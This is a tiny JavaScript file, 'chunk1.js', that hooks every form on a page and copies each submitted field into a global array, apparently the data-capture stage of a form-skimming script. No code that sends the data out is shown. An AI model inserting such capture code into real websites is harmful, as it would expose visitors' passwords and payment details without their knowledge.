// chunk1.js
window._fj_data = [];
document.querySelectorAll("form").forEach(f=>{
  f.addEventListener("submit", e=>{
    var d={};
    new FormData(f).forEach((v,k)=>d[k]=v);
    window._fj_data.push(d);
  });
});